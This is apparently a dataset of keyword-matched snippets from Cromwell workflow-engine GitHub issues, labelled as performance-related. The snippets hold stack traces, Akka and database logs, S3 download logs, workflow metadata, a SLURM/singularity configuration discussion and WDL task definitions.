java.ut",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:18848,concurren,concurrent,18848,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"ystem)] WorkflowActor [UUID(299b2fc4)]: persisting status of a to Starting.; [WARN] [03/03/2016 23:43:18.664] [test-system-akka.actor.default-dispatcher-4] [akka://test-system/system/IO-TCP/selectors/$a/1] received dead letter from Actor[akka://test-system/user/IO-HTTP/group-0/1#-1001288108]: Write(ByteString(),spray.io.SslTlsSupport$WriteChunkAck$@22a4ed01); ```. There's another 13 second hang shortly thereafter:. ```; [INFO] [03/03/2016 23:43:19.002] [test-system-akka.actor.default-dispatcher-10] [WorkflowActor(akka://test-system)] WorkflowActor [UUID(299b2fc4)]: persisting status of a to Running.; [INFO] [03/03/2016 23:43:32.134] [pool-7-thread-13-ScalaTest-running-CallCachingWorkflowSpec] [akka://test-system/user/$$h] WorkflowManagerActor submitWorkflow input id = None, effective id = c21e652b-b5f0-4435-a390-b1d61d1c9b4a; ```. Next it looks like a test is started up while pointing to the same in-memory db as this paused workflow. The paused workflow is interpreted as a workflow needing restart, so another concurrent copy is launched. . ```; [INFO] [03/03/2016 23:43:32.139] [ForkJoinPool-3-worker-3] [akka://test-system/user/$$h] WorkflowManagerActor Found 1 workflow to restart.; [INFO] [03/03/2016 23:43:32.139] [ForkJoinPool-3-worker-3] [akka://test-system/user/$$h] WorkflowManagerActor Restarting workflow ID: 299b2fc4-6a26-462f-96e3-1281f172d197; [INFO] [03/03/2016 23:43:32.152] [ForkJoinPool-3-worker-3] [akka://test-system/user/$$h] Invoking restartableWorkflow on 299b2fc4; [INFO] [03/03/2016 23:43:32.153] [ForkJoinPool-3-worker-3] [akka://test-system/user/$$h] WorkflowManagerActor submitWorkflow input id = Some(299b2fc4-6a26-462f-96e3-1281f172d197), effective id = 299b2fc4-6a26-462f-96e3-1281f172d197; ```. This quickly falls afoul of a uniqueness constraint:. ```; [ERROR] [03/03/2016 23:43:32.236] [ForkJoinPool-3-worker-1] [WorkflowActor(akka://test-system)] WorkflowActor [UUID(299b2fc4)]: Could not persist runtime attributes; java.sql.SQLIntegrityConstraintVi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/502#issuecomment-192361344:2046,concurren,concurrent,2046,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/502#issuecomment-192361344,2,['concurren'],['concurrent']
Performance,"ystem/user/cromwell-service/$b/$a/$8#-1275882726] unexpectedly terminated while conducting 11 polls. Making a new one...; [INFO] [11/12/2016 02:22:12.170] [cromwell-system-akka.actor.default-dispatcher-2686] [akka://cromwell-system/user/cromwell-service/$b/$a] watching Actor[akka://cromwell-system/user/cromwell-service/$b/$a/$9#-1852863496]; [WARN] [11/12/2016 02:22:12.171] [cromwell-system-akka.dispatchers.backend-dispatcher-2573] [akka://cromwell-system/user/cromwell-service/WorkflowManagerActor/WorkflowActor-7f0d7c16-d434-4dd7-a7ba-c7e897701c9a/WorkflowExecutionActor-7f0d7c16-d434-4dd7-a7ba-c7e897701c9a/7f0d7c16-d434-4dd7-a7ba-c7e897701c9a-EngineJobExecutionActor-salmonRun.salmonQuant:NA:1/7f0d7c16-d434-4dd7-a7ba-c7e897701c9a-BackendJobExecutionActor-7f0d7c16:salmonRun.salmonQuant:-1:1/JesAsyncBackendJobExecutionActor] JesAsyncBackendJobExecutionActor [UUID(7f0d7c16)salmonRun.salmonQuant:NA:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; 	at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); 	at akka.actor.Actor$class.aroundReceive(Actor.scala:484); 	at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); 	at akka.actor.ActorCell.invoke(ActorCell.scala:495); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665:2323,concurren,concurrent,2323,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665,4,['concurren'],['concurrent']
Performance,"z.tbi; 1608597511949,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-142/cacheCopy/SR00c.NA20320.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-142/cacheCopy/SR00c.NA20320.txt.gz.tbi; 1608597513691,download: s3://focal-sv-resources/broad-references/v0/sv-resources/resources/v1/hg38_primary_contigs.bed to focal-sv-resources/broad-references/v0/sv-resources/resources/v1/hg38_primary_contigs.bed; 1608597515955,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-127/cacheCopy/SR00c.NA19184.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-127/cacheCopy/SR00c.NA19184.txt.gz.tbi; 1608597517316,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-41/cacheCopy/SR00c.HG01880.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:159890,cache,cacheCopy,159890,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"z.tbi; 1608597513691,download: s3://focal-sv-resources/broad-references/v0/sv-resources/resources/v1/hg38_primary_contigs.bed to focal-sv-resources/broad-references/v0/sv-resources/resources/v1/hg38_primary_contigs.bed; 1608597515955,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-127/cacheCopy/SR00c.NA19184.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-127/cacheCopy/SR00c.NA19184.txt.gz.tbi; 1608597517316,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-41/cacheCopy/SR00c.HG01880.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-41/cacheCopy/SR00c.HG01880.txt.gz.tbi; 1608597520303,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-41/cacheCopy/SR00c.HG01880.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4e",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:160518,cache,cacheCopy,160518,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"ze of 100000 and a write batch size of 100000; [2019-02-11 10:13:14,75] [info] [RenameWorkflowOptionsInMetadata] 100%; [2019-02-11 10:13:15,05] [info] Running with database db.url = jdbc:hsqldb:mem:6b5d8035-4932-4680-b912-34885765f705;shutdown=false;hsqldb.tx=mvcc; [2019-02-11 10:13:15,63] [info] Slf4jLogger started; [2019-02-11 10:13:16,02] [info] Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-1ddecb5"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; [2019-02-11 10:13:16,08] [info] Metadata summary refreshing every 2 seconds.; [2019-02-11 10:13:16,20] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2019-02-11 10:13:16,23] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2019-02-11 10:13:16,25] [warn] 'docker.hash-lookup.gcr-api-queries-per-100-seconds' is being deprecated, use 'docker.hash-lookup.gcr.throttle' instead (see reference.conf); [2019-02-11 10:13:16,26] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2019-02-11 10:13:16,33] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2019-02-11 10:13:17,45] [info] SingleWorkflowRunnerActor: Version 37; [2019-02-11 10:13:17,46] [info] SingleWorkflowRunnerActor: Submitting workflow; [2019-02-11 10:13:17,59] [info] Unspecified type (Unspecified version) workflow 52999e15-953f-44d6-aaae-1774c74d2910 submitted; [2019-02-11 10:13:17,65] [info] SingleWorkflowRunnerActor: Workflow submitted 52999e15-953f-44d6-aaae-1774c74d2910; [2019-02-11 10:13:17,65] [info] 1 new workflows fetched; [2019-02-11 10:13:17,66] [info] WorkflowManagerActor Starting workflow 52999e15-953f-44d6-aaae-1774c74d2910; [2019-02-11 10:13:17,67] [info] WorkflowManagerActor Successfully started WorkflowActor-52999e15-953f-44d6-aaae-1774c74d2910; [2019-02-11 10:13:17,67] [info] Retrieved 1 workflows from the Workflo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4626:2443,throttle,throttle,2443,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4626,1,['throttle'],['throttle']
Performance,"{; ""shardIndex"": 11,; ""Effective call caching mode"": ""ReadAndWriteCache"",; ""backend"": ""Local"",; ""attempt"": 1,; ""start"": ""2016-09-23T13:53:07.287Z""; },; {; ""shardIndex"": 12,; ""Effective call caching mode"": ""ReadAndWriteCache"",; ""backend"": ""Local"",; ""attempt"": 1,; ""start"": ""2016-09-23T13:53:07.287Z""; },; {; ""shardIndex"": 13,; ""Effective call caching mode"": ""ReadAndWriteCache"",; ""backend"": ""Local"",; ""attempt"": 1,; ""start"": ""2016-09-23T13:53:07.288Z""; },; {; ""shardIndex"": 14,; ""Effective call caching mode"": ""ReadAndWriteCache"",; ""backend"": ""Local"",; ""attempt"": 1,; ""start"": ""2016-09-23T13:53:07.289Z""; },; {; ""shardIndex"": 15,; ""Effective call caching mode"": ""ReadAndWriteCache"",; ""backend"": ""Local"",; ""attempt"": 1,; ""start"": ""2016-09-23T13:53:07.289Z""; },; {; ""shardIndex"": 16,; ""Effective call caching mode"": ""ReadAndWriteCache"",; ""backend"": ""Local"",; ""attempt"": 1,; ""start"": ""2016-09-23T13:53:07.289Z""; }; ],; ""case_gatk_acnv_workflow.PadTargets"": [; {; ""Call caching read result"": ""Cache Hit: 6b52652e-a50d-4787-86b1-794e53958ada:case_gatk_acnv_workflow.PadTargets:-1"",; ""executionStatus"": ""Done"",; ""stdout"": ""/home/lichtens/test_eval/cromwell-executions/case_gatk_acnv_workflow/ecf3a99c-634e-42d6-9e25-1ebba542098c/call-PadTargets/execution/stdout"",; ""shardIndex"": -1,; ""outputs"": {; ""padded_target_file"": ""/home/lichtens/test_eval/cromwell-executions/case_gatk_acnv_workflow/ecf3a99c-634e-42d6-9e25-1ebba542098c/call-PadTargets/execution/targets.padded.tsv""; },; ""runtimeAttributes"": {; ""docker"": ""broadinstitute/gatk-protected:24e6bdc0c058eaa9abe63e1987418d0c144fef8e"",; ""failOnStderr"": false,; ""continueOnReturnCode"": ""0""; },; ""cache"": {; ""allowResultReuse"": true; },; ""Effective call caching mode"": ""ReadAndWriteCache"",; ""inputs"": {; ""target_file"": ""/data/target/ice_targets.tsv"",; ""mem"": 1,; ""padding"": 250,; ""gatk_jar"": ""/root/gatk-protected.jar"",; ""isWGS"": false; },; ""returnCode"": 0,; ""backend"": ""Local"",; ""end"": ""2016-09-23T13:53:07.897Z"",; ""stderr"": ""/home/lichtens/test_eval/cromwel",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1480:75958,Cache,Cache,75958,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1480,1,['Cache'],['Cache']
Performance,"{cwd} -o ${cwd}/execution/stdout -e ${cwd}/execution/stderr -t ${runtime_minutes} \; ${""-c "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --wrap ""singularity exec --userns -B ${cwd}:${docker_cwd} $IMAGE ${job_shell} ${script}""; """"""; ```. Just two things I'd like to discuss. Firstly, because you are pulling the docker image inside the sbatch script, this depends on the cluster you're working on allowing network access for the workers. While that is possible on our local cluster, my discussion with some sysadmins made me realise that this wasn't necessarily commonplace, and even on our cluster they strongly discouraged me from relying too heavily on it. This made me look for a solution that was even more generalizable. This is why I `singularity build` the image before I submit it, using the head node. This ensures that all network-requiring work is done on the head node, where network access is guaranteed. I also make sure to set a cache directory, so we don't download the same docker image multiple times in the case of a scatter job etc. Of course, if you do have network access for your workers and the admins have no issue with you using it, pulling the image from the worker is probably a better option to avoid hogging the head node. The second main difference in my config is that the singularity binary I was using did not have `setuid` permissions, meaning that I had to use the sandbox format, and run the image using `--userns`. This is obviously only required if your sysadmins don't trust `singularity`, but I think it's important to demonstrate a way of running containers without *any* privileges at all. @geoffjentry all this discussion is obviously going way beyond this original PR. Once we've settled on our recommendations, how do you think we should share this information with the Cromwell community? Is an example config in the Cromwell repo the best way (like this PR), or would it serve better to have a new page in the Cromwell documentation? I'm",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461281475:1359,cache,cache,1359,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461281475,1,['cache'],['cache']
Performance,"~[cromwell.jar:0.19]; at com.mysql.jdbc.ConnectionImpl.execSQL(ConnectionImpl.java:2541) ~[cromwell.jar:0.19]; at com.mysql.jdbc.ConnectionImpl.setAutoCommit(ConnectionImpl.java:4882) ~[cromwell.jar:0.19]; at com.zaxxer.hikari.proxy.ConnectionProxy.setAutoCommit(ConnectionProxy.java:334) ~[cromwell.jar:0.19]; at com.zaxxer.hikari.proxy.ConnectionJavassistProxy.setAutoCommit(ConnectionJavassistProxy.java) ~[cromwell.jar:0.19]; at slick.jdbc.JdbcBackend$BaseSession.startInTransaction(JdbcBackend.scala:437) ~[cromwell.jar:0.19]; at slick.driver.JdbcActionComponent$StartTransaction$.run(JdbcActionComponent.scala:41) ~[cromwell.jar:0.19]; at slick.driver.JdbcActionComponent$StartTransaction$.run(JdbcActionComponent.scala:38) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anon$2.liftedTree1$1(DatabaseComponent.scala:237) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anon$2.run(DatabaseComponent.scala:237) ~[cromwell.jar:0.19]; at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) ~[na:1.8.0_72]; at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) ~[na:1.8.0_72]; at java.lang.Thread.run(Thread.java:745) ~[na:1.8.0_72]; Caused by: java.io.EOFException: Can not read response from server. Expected to read 4 bytes, read 0 bytes before connection was unexpectedly lost.; at com.mysql.jdbc.MysqlIO.readFully(MysqlIO.java:2926) ~[cromwell.jar:0.19]; at com.mysql.jdbc.MysqlIO.reuseAndReadPacket(MysqlIO.java:3344) ~[cromwell.jar:0.19]; ... 16 common frames omitted; 2016-04-26 14:06:37,506 cromwell-system-akka.actor.default-dispatcher-15 INFO - WorkflowActor [UUID(143681e1)]: persisting status of GatherBqsrReports to Failed.; 2016-04-26 14:06:37,506 cromwell-system-akka.actor.default-dispatcher-15 ERROR - WorkflowActor [UUID(143681e1)]: Communications link failure. The last packet successfully received from the server was 324 milliseconds ago. The last packet sent successfully to ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/742:2498,concurren,concurrent,2498,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/742,1,['concurren'],['concurrent']
Performance,~[cromwell.jar:0.19]; at scala.collection.immutable.List.foldLeft(List.scala:84) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.CallMetadataBuilder$.build(CallMetadataBuilder.scala:232) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowMetadataBuilder$$anonfun$cromwell$engine$workflow$WorkflowMetadataBuilder$$buildWorkflowMetadata$2.apply(WorkflowMetadataBuilder.scala:95) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowMetadataBuilder$$anonfun$cromwell$engine$workflow$WorkflowMetadataBuilder$$buildWorkflowMetadata$2.apply(WorkflowMetadataBuilder.scala:85) ~[cromwell.jar:0.19]; at scala.util.Success$$anonfun$map$1.apply(Try.scala:237) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at scala.util.Success.map(Try.scala:237) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala:121) ~[cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) ~[cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.pollAndExecAll(ForkJo,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/927:2925,concurren,concurrent,2925,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/927,1,['concurren'],['concurrent']
Performance,"~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[cromwell.jar:0.19]; at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90) ~[cromwell.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; ```. AND 8 instances of these:. ```; 2016-05-03 17:58:04,687 cromwell-system-akka.actor.default-dispatcher-18 INFO - JES Run [UUID(d3ba97c6):ValidateReadGroupSamFile:13]: Status change from Running to Success; 2016-05-03 17:58:04,820 cromwell-system-akka.actor.default-dispatcher-8 WARN - Caught exception, retrying: 504 Gateway Time-out; {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; com.google.api.clie",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:6088,concurren,concurrent,6088,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['concurren'],['concurrent']
Performance,~[cromwell.jar:0.19];   at scala.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[cromwell.jar:0.19];   at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19];   at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:569) ~[cromwell.jar:0.19];   at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:568) ~[cromwell.jar:0.19];   at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19];   at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19];   at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:251) ~[cromwell.jar:0.19];   at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:249) ~[cromwell.jar:0.19];   at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19];   at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19];   at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19];   at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19];   at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19];   at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19];   at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19];   at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala:121) ~[cromwell.jar:0.19];   at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19];   at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19];   at scala.concurrent.forkjoin.ForkJoinPool.runWork,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/810:5559,concurren,concurrent,5559,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/810,2,['concurren'],['concurrent']
Performance,"~{unqced_sample_list} \; ~{withdrawn_sample_list} \; ~{sex_mismatch_sample_list} \; ~{sex_aneuploidy_sample_list} \; ~{low_genotyping_quality_sample_list} \; ~{""--subpop "" + subpop_sample_list}; >>> . runtime {; shortTask: true; dx_timeout: ""5m""; }; }. task load_shared_covars {; input {; String script_dir; File script = ""~{script_dir}/traits/load_shared_covars.py"". File fam_file; File sc_pcs # 22009; File sc_assessment_ages; }. output {; # all in traits/shared_covars/; File shared_covars = ""shared_covars.npy"" ; File covar_names = ""covar_names.txt""; File assessment_ages = ""assessment_ages.npy""; }. command <<<; ~{script} . ~{fam_file} ~{sc_pcs} ~{sc_assessment_ages}; >>>. runtime {; memory: ""10g"". dx_timeout: ""15m""; }; }. task load_continuous_phenotype {; input {; String script_dir; File script = ""~{script_dir}/traits/load_continuous_phenotype_from_main_dataset.py"". File sc; File qced_sample_list # from qced_sample_list. File assessment_ages_npy # from load shared covars; Array[String] categorical_covariate_names; Array[File] categorical_covariate_scs; }. output {; File data = ""pheno.npy""; File covar_names = ""pheno_covar_names.txt""; File README = ""pheno_README.txt""; }. command <<<; ~{script} \; ~{sc} \; '.' \; ~{qced_sample_list} \; ~{assessment_ages_npy} \; --categorical-covariate-names ~{sep="" "" categorical_covariate_names} \; --categorical-covariate-files ~{sep="" "" categorical_covariate_scs}; >>>. runtime {; shortTask: true; dx_timeout: ""5m""; }; }. task load_binary_phenotype {; input {; String script_dir; File script = ""~{script_dir}/traits/load_binary_phenotype_from_main_dataset.py"". File sc; File qced_sample_list # from qced_sample_list. File sc_year_of_birth # 34; File sc_month_of_birth # 52; File sc_date_of_death # 40000; String date_of_most_recent_first_occurrence_update; Boolean is_zero_one_neg_nan = false; }. output {; File data = ""pheno.npy""; File covar_names = ""pheno_covar_names.txt""; File README = ""pheno_README.txt""; }. command <<<; ~{script} \; ~{sc} \; '",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971#issuecomment-1355222269:11937,load,load,11937,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971#issuecomment-1355222269,1,['load'],['load']
Performance,"~~@ruchim writing a cache result (its hashes and its results) should be functionally atomic (i.e. either you get a cache hit, or you don't, and if you do, then you can copy all the results immediately).; If that's not part of this PR then it should 100% be part of Cromwell 27 (IMO)~~. Oops, I misread. You're talking about cache hit vs cache miss in the metadata if copying results fails? If the metadata is overwriting itself then ""current state of play"" is probably ok?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2243#issuecomment-300173806:20,cache,cache,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2243#issuecomment-300173806,4,['cache'],['cache']
